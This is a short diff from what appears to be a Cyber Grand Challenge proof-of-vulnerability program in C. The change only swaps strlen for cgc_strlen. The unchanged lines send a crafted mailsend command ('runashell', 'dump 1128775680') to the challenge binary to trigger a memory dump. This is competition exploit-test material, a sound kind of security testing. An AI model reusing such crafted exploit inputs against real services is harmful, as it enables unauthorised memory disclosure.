@@ -98,7 +98,7 @@ int main(void) {
   ReceiveFromCB(input, 10);
   char bytes[95] = "mailsend -d\nPOST sender:sender!recipient:runashell!body:dump 1128775680!subject:subject!\nQUIT\n";
   //print_integer(bytes + 47, t2vals.region_addr);
-  SendToCB(bytes, strlen(bytes));
+  SendToCB(bytes, cgc_strlen(bytes));
   size_t bytes_received;
   unsigned int i;
   ReceiveFromCB((char *)&i, 4);
